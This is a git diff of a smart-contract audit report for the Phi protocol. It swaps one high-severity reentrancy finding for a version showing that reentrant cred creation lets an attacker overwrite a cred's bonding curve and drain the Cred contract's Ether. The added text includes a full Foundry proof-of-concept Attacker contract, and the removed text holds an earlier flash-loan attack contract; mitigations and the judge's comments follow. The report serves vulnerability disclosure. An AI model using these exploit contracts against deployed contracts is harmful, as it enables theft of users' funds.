@@ -795,31 +795,73 @@ DoS
 
 ***
 
-## [[H-06] Reentrancy vulnerability allows bypass of cooldown, leading to unfair reward extraction through flash loan](https://github.com/code-423n4/2024-08-phi-findings/issues/25)
-*Submitted by [0xCiphky](https://github.com/code-423n4/2024-08-phi-findings/issues/25), also found by [0xc0ffEE](https://github.com/code-423n4/2024-08-phi-findings/issues/283), smaul ([1](https://github.com/code-423n4/2024-08-phi-findings/issues/279), [2](https://github.com/code-423n4/2024-08-phi-findings/issues/68)), [hearmen](https://github.com/code-423n4/2024-08-phi-findings/issues/274), [farismaulana](https://github.com/code-423n4/2024-08-phi-findings/issues/269), [aldarion](https://github.com/code-423n4/2024-08-phi-findings/issues/266), [Decap](https://github.com/code-423n4/2024-08-phi-findings/issues/244), [rscodes](https://github.com/code-423n4/2024-08-phi-findings/issues/225), [lu1gi](https://github.com/code-423n4/2024-08-phi-findings/issues/204), [Jorgect](https://github.com/code-423n4/2024-08-phi-findings/issues/201), CAUsr ([1](https://github.com/code-423n4/2024-08-phi-findings/issues/195), [2](https://github.com/code-423n4/2024-08-phi-findings/issues/194)), [pfapostol](https://github.com/code-423n4/2024-08-phi-findings/issues/169), [McToady](https://github.com/code-423n4/2024-08-phi-findings/issues/148), [hail\_the\_lord](https://github.com/code-423n4/2024-08-phi-findings/issues/132), [Ruhum](https://github.com/code-423n4/2024-08-phi-findings/issues/129), [IzuMan](https://github.com/code-423n4/2024-08-phi-findings/issues/128), [hgrano](https://github.com/code-423n4/2024-08-phi-findings/issues/113), [MrPotatoMagic](https://github.com/code-423n4/2024-08-phi-findings/issues/82), [Agontuk](https://github.com/code-423n4/2024-08-phi-findings/issues/71), 0xrex ([1](https://github.com/code-423n4/2024-08-phi-findings/issues/49), [2](https://github.com/code-423n4/2024-08-phi-findings/issues/21)), [KupiaSec](https://github.com/code-423n4/2024-08-phi-findings/issues/47), and [JanuaryPersimmon2024](https://github.com/code-423n4/2024-08-phi-findings/issues/17)*
+## [[H-06] Reentrancy in creating Creds allows an attacker to steal all Ether from the Cred contract](https://github.com/code-423n4/2024-08-phi-findings/issues/25)
+*Submitted by [CAUsr](https://github.com/code-423n4/2024-08-phi-findings/issues/195), also found by [0xCiphky](https://github.com/code-423n4/2024-08-phi-findings/issues/25), [0xc0ffEE](https://github.com/code-423n4/2024-08-phi-findings/issues/283), smaul ([1](https://github.com/code-423n4/2024-08-phi-findings/issues/279), [2](https://github.com/code-423n4/2024-08-phi-findings/issues/68)), [hearmen](https://github.com/code-423n4/2024-08-phi-findings/issues/274), [farismaulana](https://github.com/code-423n4/2024-08-phi-findings/issues/269), [aldarion](https://github.com/code-423n4/2024-08-phi-findings/issues/266), [Decap](https://github.com/code-423n4/2024-08-phi-findings/issues/244), [rscodes](https://github.com/code-423n4/2024-08-phi-findings/issues/225), [lu1gi](https://github.com/code-423n4/2024-08-phi-findings/issues/204), [Jorgect](https://github.com/code-423n4/2024-08-phi-findings/issues/201), CAUsr ([2](https://github.com/code-423n4/2024-08-phi-findings/issues/194)), [pfapostol](https://github.com/code-423n4/2024-08-phi-findings/issues/169), [McToady](https://github.com/code-423n4/2024-08-phi-findings/issues/148), [hail\_the\_lord](https://github.com/code-423n4/2024-08-phi-findings/issues/132), [Ruhum](https://github.com/code-423n4/2024-08-phi-findings/issues/129), [IzuMan](https://github.com/code-423n4/2024-08-phi-findings/issues/128), [hgrano](https://github.com/code-423n4/2024-08-phi-findings/issues/113), [MrPotatoMagic](https://github.com/code-423n4/2024-08-phi-findings/issues/82), [Agontuk](https://github.com/code-423n4/2024-08-phi-findings/issues/71), 0xrex ([1](https://github.com/code-423n4/2024-08-phi-findings/issues/49), [2](https://github.com/code-423n4/2024-08-phi-findings/issues/21)), [KupiaSec](https://github.com/code-423n4/2024-08-phi-findings/issues/47), and [JanuaryPersimmon2024](https://github.com/code-423n4/2024-08-phi-findings/issues/17)*
 
-The [`distribute`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L77) function in the `CuratorRewardsDistributor` contract is responsible for distributing curator rewards accumulated for a specified `credId`. These rewards are distributed based on the number of shares a user owns in a `cred`. The function can be called by anyone, and the caller earns a fee for doing so.
+***Note: the [submission](https://github.com/code-423n4/2024-08-phi-findings/issues/25) from warden 0xCiphky was originally featured as `H-06` in this report; however, after further discussion between the judge and sponsor, it was determined that a different submission demonstrates the largest impact of the common issue. Per direction from the judge, this audit report was updated on October 16, 2024 to instead highlight the submission below from warden CAUsr.***
 
-To prevent flash loan attacks where an attacker could buy a large number of shares, call the `distribute` function, and then immediately sell the shares to capture most of the rewards, the [`buyShareCred`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178) function in the `Cred` contract implements a cooldown period. This cooldown is intended to prevent a user from immediately selling their shares after buying them.
+### Vulnerability Details
 
-- **Reference:** [[H1] Reward distribution is vulnerable to flash loan attacks](https://github.com/code-423n4/2024-08-phi/blob/main/docs/audit/Renascence%20-%20Phi%20Audit%20Report.pdf)
+During cred creation, the sender automatically buys 1 share of the cred. During share purchases, a refund is issued if Ether provided by the sender exceeds the value needed. It allows an attacker to reenter both cred creation and share trading functions. Which, in turn, allows the attacker to overwrite cred data before the `credIdCounter` is incremented. This fact introduces a critical vulnerability in the case when there is more than one whitelisted bonding curve. The attacker can purchase shares cheaply, overwrite the cred, and sell the shares expensively, almost depleting the entire contract balance.
 
-However, the cooldown mechanism is flawed. Specifically, the [`_handleTrade`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L588) function, which is called internally by `buyShareCred`, refunds any excess payment before updating the `lastTradeTimestamp` used to enforce the cooldown period. This sequence allows for a reentrancy attack, where the attacker can exploit the refund callback to bypass the cooldown period and sell the shares immediately after purchasing them, thereby executing a flash loan attack.
+Let's discuss a possible attack vector in detail.
 
-```solidity
-    function _handleTrade(
-        uint256 credId_,
-        uint256 amount_,
-        bool isBuy,
-        address curator_,
-        uint256 priceLimit
-    )
-        internal
-        whenNotPaused
-    {
-        ...
-        _updateCuratorShareBalance(credId_, curator_, amount_, isBuy);
+Preparations. The attacker prepares two sets of cred creation data which may be quite legit. The most important aspect is that the first set uses a "cheaper" bonding curve and the other uses a more expensive one (see the Impact section for more details). The sender's address would be a helper contract address. However, the attacker doesn't need to deploy the contract beforehand to know its address, since there are several ways to know a to-be-deployed contract address without exposing its bytecode (e.g. by deployer address and nonce or with the help of the `CREATE2` opcode). To sum up, at the moment of checking cred creation data and signing there are no signs of malignancy.
 
+Then, the attacker deploys the helper contract and invokes an attack. Further actions are executed by the contract in a single transaction as follows.
+
+1. The attacker creates the first cred, with the cheap `IBondingCurve` used. The cred creation code invokes `buyShareCred(credIdCounter, 1, 0);` as part of its job. The attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker. Note that [the counter increment](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L574) is not reached yet.
+
+    ```solidity
+        function _createCredInternal(
+            address creator_,
+            string memory credURL_,
+            string memory credType_,
+            string memory verificationType_,
+            address bondingCurve_,
+            uint16 buyShareRoyalty_,
+            uint16 sellShareRoyalty_
+        )
+            internal
+            whenNotPaused
+            returns (uint256)
+        {
+            if (creator_ == address(0)) {
+                revert InvalidAddressZero();
+            }
+    
+            creds[credIdCounter].creator = creator_;
+            creds[credIdCounter].credURL = credURL_;
+            creds[credIdCounter].credType = credType_;
+            creds[credIdCounter].verificationType = verificationType_;
+            creds[credIdCounter].bondingCurve = bondingCurve_;
+            creds[credIdCounter].createdAt = uint40(block.timestamp);
+            creds[credIdCounter].buyShareRoyalty = buyShareRoyalty_;
+            creds[credIdCounter].sellShareRoyalty = sellShareRoyalty_;
+    
+            buyShareCred(credIdCounter, 1, 0);
+    
+            emit CredCreated(creator_, credIdCounter, credURL_, credType_, verificationType_);
+    
+            credIdCounter += 1;
+    
+            return credIdCounter - 1;
+        }
+    ```
+
+2. The attacker buys some amount of shares of the almost created cred by invoking [buyShareCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178). Note that there are no significant obstacles to doing that as the attacker can employ a flash loan. Again, the attacker provides excess Ether, so a refund is triggered and the control goes back to the attacker.
+ 
+3. Remember that the control is still nested in `buyShareCred` nested in the first `createCred`. This time the attacker invokes the [createCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L232-L241) again, with the second cred creation data, with a more expensive bonding curve used. Note that there are no reentrancy guards in `createCred`, `buyShareCred`, or `sellShareCred`. The data is passed to [_createCredInternal](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L557-L570) where it overwrites the first cred contents in the `creds[credIdCounter]` (remember, the counter is not incremented yet by the first `createCred`). [Here is](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L565) the most important part of the overwriting for the attacker: they just changed the bonding curve.
+
+    ```solidity
+        creds[credIdCounter].bondingCurve = bondingCurve_;
+    ```
+
+A couple of lines below `buyShareCred` will be hit again and the attacker grabs back the control in the usual manner.
+
+4. Now the attacker calls `sellShareCred` and dumps as many purchased shares as possible until depleting the Cred balance or his own share balance. The "more expensive" bonding curve gives the attacker more Ether than they spend while buying on step 2. Note that the share lock time also won't help as the timestamp [is not yet set](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L644), which is the subject of another finding.
+
+    ```solidity
         if (isBuy) {
             cred.currentSupply += amount_;
             uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
@@ -828,120 +870,237 @@ However, the cooldown mechanism is flawed. Specifically, the [`_handleTrade`](ht
             }
             lastTradeTimestamp[credId_][curator_] = block.timestamp;
         } else {
-            ...
+            cred.currentSupply -= amount_;
+            curator_.safeTransferETH(price - protocolFee - creatorFee);
         }
-	...
-    }
-```
+    ```
+   
+Even if the `SHARE_LOCK_PERIOD` was honored, that would mean that the attacker has to wait 10 minutes before pocketing the profit. That would make the situation a bit more difficult for the attacker, but still highly dangerous for the protocol.
 
-### Consider the following scenario
-
-- **User A** takes a flash loan and calls the [`buyShareCred`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L178) function to purchase 100 shares in `cred` A, which currently has only 10 shares.
-    - **User A** deliberately overpays for the shares to trigger a refund, which will be used in the attack.
-    - During the refund callback, **User A** calls the [`distribute`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L77) function in the `CuratorRewardsDistributor` contract to distribute the rewards for `cred` A.
-    - Immediately after, **User A** calls the [`sellShareCred`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L182) function to sell all the shares, again within the refund callback.
-- The initial `buyShareCred` function completes, and **User A** successfully bypasses the cooldown period and captures the majority of `cred` A’s rewards through a flash loan attack.
+5. At this moment almost all Ether from the Cred contract is transferred to the attacker's contract. The attacker has to keep some of the Ether intact since now the unwinding of the nested calls is happening (and some fees are paid): the second `createCred`, `buyShareCred`, and the first `createCred`.
 
 ### Impact
 
-- Severity: Medium/High. This issue enables users to bypass the protocol’s cooldown mechanism, allowing them to use flash loans to extract the majority of a credential's curator rewards without adhering to the required staking period. As a result, legitimate users unfairly miss out on the rewards they are entitled to.
-- Likelihood: High. This attack can be performed on any `cred`, as long as the potential profit outweighs the costs involved.
+As soon as there is more than one bonding curve whitelisted in the protocol, the vulnerability allows to drain almost entire protocol funds. Whitelisting more than one curve [seems to be an expected behavior](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L159-L166).
+
+Fine-tuning the numbers to exploit the bonding curve price differences is a mere technicality, e.g. if there was just a 10% price difference that would be more than enough to perform an attack. Also note that on the current codebase, the attack may be repeated numerously and instantly.
 
 ### Proof of Concept
 
-```solidity
-// SPDX-License-Identifier: Unlicense
-pragma solidity 0.8.25;
+Please apply the patch to the `test/Cred.t.sol` and run with `forge test --match-test testCredDraining -vv`.
 
-import { AttackContract } from "./AttackContract.sol";
-...
-contract Settings is Test, TestUtils {
-    ...
-    AttackContract attackContract;
-		...
-    function setUp() public virtual {
-        ...
-        attackContract = new AttackContract(address(cred), address(curatorRewardsDistributor), address(phiRewards));
-    }
-}
+<details>
+
+```diff
+diff --git a/test/Cred.t.sol.orig b/test/Cred.t.sol
+index da9157c..12b60e7 100644
+--- a/test/Cred.t.sol.orig
++++ b/test/Cred.t.sol
+@@ -9,7 +9,9 @@ import { LibClone } from "solady/utils/LibClone.sol";
+ import { Settings } from "./helpers/Settings.sol";
+ import { Cred } from "../src/Cred.sol";
+ import { ICred } from "../src/interfaces/ICred.sol";
++import { IBondingCurve } from "../src/interfaces/IBondingCurve.sol";
+ import { BondingCurve } from "../src/curve/BondingCurve.sol";
++import { FixedPriceBondingCurve } from "../src/lib/FixedPriceBondingCurve.sol";
+ 
+ contract TestCred is Settings {
+     uint256 private constant GRACE_PERIOD = 14 days;
+@@ -243,4 +245,158 @@ contract TestCred is Settings {
+         // Final assertions
+         assertEq(cred.credInfo(credId).currentSupply, 1); // Only initial purchase remains
+     }
++
++    // test helper function
++    function _makeCreateData(address curve, address sender) private view returns (bytes memory data, bytes memory signature) {
++        bytes memory signCreateData = abi.encode(
++            block.timestamp + 100, sender, 0, curve, "test", "BASIC", "SIGNATURE", 0x0
++        );
++        bytes32 createMsgHash = keccak256(signCreateData);
++        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
++        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
++        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
++
++        return (signCreateData, abi.encodePacked(cr, cs));
++    }
++
++    // forge test --match-test testCredDraining -vv
++    function testCredDraining() public {
++        // Constructing playground
++        _createCred("BASIC", "SIGNATURE", 0x0);
++        vm.startPrank(owner);
++        FixedPriceBondingCurve cheapCurve = new FixedPriceBondingCurve(owner);
++        cheapCurve.setCredContract(address(cred));
++        cred.addToWhitelist(address(cheapCurve));
++        vm.stopPrank();
++
++        vm.deal(address(cred), 50 ether);
++        uint credInitialBalance = address(cred).balance;
++        // Playground constructed: some creds and some ether received from share buyers
++
++        vm.deal(anyone, 2 ether);
++        uint attackerInitialBalance = address(anyone).balance;
++        vm.startPrank(anyone);
++        Attacker a = new Attacker(ICredExt(address(cred)));
++        // Step 0:
++        // Attack starts with just a couple of creds about to be created.
++        (bytes memory cheapData, bytes memory cheapSignature) = _makeCreateData(address(cheapCurve), address(a));
++        (bytes memory expensiveData, bytes memory expensiveSignature) = _makeCreateData(address(bondingCurve), address(a));
++
++        // See the contract Attacker for further details
++        a.attack{ value: 2 ether }(cheapData, cheapSignature, expensiveData, expensiveSignature);
++
++        uint credLosses = credInitialBalance - address(cred).balance;
++        uint attackerGains = address(anyone).balance - attackerInitialBalance;
++
++        console2.log("Cred lost: ", credLosses * 100 / credInitialBalance, "% of its balance");
++        assert(credLosses > 45 ether);
++        console2.log("Attacker gained: ", attackerGains / attackerInitialBalance, "times his initial balance");
++        assert(attackerGains > 40 ether);
++    }
++}
++
++
++interface ICredExt is ICred {
++    function createCred(
++        address creator_,
++        bytes calldata signedData_,
++        bytes calldata signature_,
++        uint16 buyShareRoyalty_,
++        uint16 sellShareRoyalty_
++    ) external payable;
++
++    function credIdCounter() external returns (uint256);
+ }
++
++contract Attacker
++{
++    uint256 private constant sharesBuffer = 900;
++
++    ICredExt private immutable cred;
++    address private immutable owner;
++
++    bytes private cheapData;
++    bytes private cheapSignature;
++    bytes private expensiveData;
++    bytes private expensiveSignature;
++
++    uint256 private stage = 0;
++    uint256 private credId;
++
++    constructor(ICredExt cred_) {
++        cred = cred_;
++        owner = msg.sender;
++    }
++
++    function _createCred(bytes storage data, bytes storage signature) private {
++        cred.createCred{ value: 1.5 ether }(address(this), data, signature, 0, 0);
++    }
++
++    function attack(bytes calldata cheapData_, bytes calldata cheapSignature_,
++                    bytes calldata expensiveData_, bytes calldata expensiveSignature_) external payable {
++        require(msg.sender == owner);
++
++        // All the action is packed inside this call and several receive() callbacks.
++        cheapData = cheapData_;
++        cheapSignature = cheapSignature_;
++        expensiveData = expensiveData_;
++        expensiveSignature = expensiveSignature_;
++
++        stage = 1;
++        credId = cred.credIdCounter();  // This credId will be eventually overwritten in the Cred.
++
++        // Step 1: creating the first cred, with a cheap IBondingCurve used.
++        _createCred(cheapData, cheapSignature);
++
++        stage = 0;  // End of attack, at this moment the money is gone.
++    }
++
++    receive() external payable {
++        require(msg.sender == address(cred));
++
++        if (stage == 1) {
++            stage = 2;
++            // Step 2: we got there with excess payment refund triggered deep inside createCred.
++            // Now we buy more shares cheaply and hit receive() again with another refund.
++            cred.buyShareCred{ value: 0.1 ether }(credId, sharesBuffer, 0);
++        }
++        else if (stage == 2) {
++            stage = 3;
++            // Step 3: not is a tricky part: we create a new cred, but credIdCounter is not updated yet!
++            // Essentially, we overwrite the cred created at the step 1, setting an expensive IBondingCurve,
++            // and triggering another refund.
++            _createCred(expensiveData, expensiveSignature);
++        }
++        else if (stage == 3) {
++            stage = 4;
++            assert(credId == cred.credIdCounter()); // yep, we're still here
++
++            // Step 4: time to sell. Just an example of estimation of withdrawable value.
++            uint256 sellAmount = 0;
++            // We need to keep some fee on the cred's balance to allow nested call unwinds.
++            uint256 initialProtocolFee = 0.1 ether;
++            IBondingCurve curve = IBondingCurve(cred.credInfo(credId).bondingCurve);
++            while (sellAmount < sharesBuffer + 2) {
++                (uint256 price, uint256 protocolFee, uint256 creatorFee) =
++                        curve.getPriceData(credId, sharesBuffer + 2, sellAmount + 1, false);
++                if (price + protocolFee + creatorFee + initialProtocolFee > address(cred).balance)
++                    break;
++                else
++                    sellAmount++;
++            }
++
++            cred.sellShareCred(credId, sellAmount, 0);
++        }
++        else if (stage == 4) {
++            // The final step receives the sale profit and also allows nested calls to unwind the stack.
++            withdraw();    // Receiving and sending to the attacker.
++        }
++        else
++            revert("bad stage");
++    }
++
++    function withdraw() public {
++        payable(owner).transfer(address(this).balance);
++    }
++}
++
 ```
 
-```solidity
-    function test_flashloan_fees() public {
-        // Create cred
-        _createCred("BASIC", "SIGNATURE", 0x0);
-        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
-        assertEq(buyPrice, 1_091_874_359_329_268, "buy price is correct");
-        //buy share using random user
-        vm.startPrank(anyone);
-        cred.buyShareCred{ value: buyPrice }(1, 1, 0);
-        assertEq(cred.isShareHolder(1, anyone), true, "cred 0 is voted by anyone");
-        vm.stopPrank();
-        // Deposit some ETH to the curatorRewardsDistributor
-        curatorRewardsDistributor.deposit{ value: 1 ether }(1, 1 ether);
-        // Use attack contract to take flashloan, buy shares, distr rewards, sell shares, claim reward in one tx
-        vm.deal(address(attackContract), 10 ether);
-        uint256 attackContrBalBefore = (address(attackContract)).balance;
-        uint256 buyPrice10 = bondingCurve.getBuyPriceAfterFee(1, 2, 10);
-        attackContract.buy(10, buyPrice10);
-        uint256 attackContrBalAfter = (address(attackContract)).balance;
-        // profit = 0.83 ETH
-        //console2.log("profit", attackContrBalAfter - attackContrBalBefore);
-        // check if Attack Contract in profit
-        assertGt(attackContrBalAfter, attackContrBalBefore);
-    }
-```
-
-Add `AttackContract` to test/helpers:
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.25;
-
-import { Cred } from "../../src/Cred.sol";
-import { CuratorRewardsDistributor } from "../../src/reward/CuratorRewardsDistributor.sol";
-import { PhiRewards } from "../../src/reward/PhiRewards.sol";
-
-contract AttackContract {
-    Cred credContract;
-    CuratorRewardsDistributor CRDContract;
-    PhiRewards PhiRewardsContract;
-    bool notActive = true;
-
-    constructor(address _cred, address _CuratorRewardsDistributor, address _PhiRewards) {
-        credContract = Cred(_cred);
-        CRDContract = CuratorRewardsDistributor(_CuratorRewardsDistributor);
-        PhiRewardsContract = PhiRewards(_PhiRewards);
-    }
-
-    function buy(uint256 _amount, uint256 _buyPrice) public {
-        credContract.buyShareCred{ value: _buyPrice + 0.01 ether }(1, _amount, 0);
-    }
-
-    receive() external payable {
-        if (notActive) {
-            notActive = false;
-            CRDContract.distribute(1);
-            credContract.sellShareCred(1, credContract.getShareNumber(1, address(this)), 0);
-            PhiRewardsContract.withdraw(address(this), 0);
-        }
-    }
-}
-```
+</details>
 
 ### Tools Used
 
-Foundry
+Manual Review, Foundry
 
-### Recommendation
+### Recommended Mitigation Steps
 
-Ensure that the `lastTradeTimestamp` is updated before processing any refunds or external calls. This will prevent the following attack by ensuring that the cooldown period is enforced before any subsequent actions can be taken.
+To mitigate this attack vector it would be enough to add a reentrancy guard [here](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L241):
 
-### Assessed type
+```solidity
+    function createCred(
+        address creator_,
+        bytes calldata signedData_,
+        bytes calldata signature_,
+        uint16 buyShareRoyalty_,
+        uint16 sellShareRoyalty_
+    )
+        public
+        payable
+        whenNotPaused
++       nonReentrant
+    {
+```
 
-Reentrancy
+* However, I recommend protecting with reentrancy guards all protocol functions directly or indirectly dealing with assets or important state.
+* Another important measure to consider is adhering to the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern).
 
-**[ZaK3939 (Phi) confirmed](https://github.com/code-423n4/2024-08-phi-findings/issues/25#event-14169412928)**
+**[ZaK3939 (Phi) confirmed via issue \#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25#event-14169412928)**
+
+***Please note: the following re-assessment took place approximately 3 weeks after judging and awarding were finalized.***
+
+**[0xDjango (judge) commented](https://github.com/code-423n4/2024-08-phi-findings/issues/195#issuecomment-2414861921):**
+> After further discussion, this submission should be selected for the public report. It shares the same root cause and fix as [#25](https://github.com/code-423n4/2024-08-phi-findings/issues/25), though highlights a much more severe impact. Sponsor indicated that there is a possibility that multiple price curves may be selectable in the future.
 
 ***
 
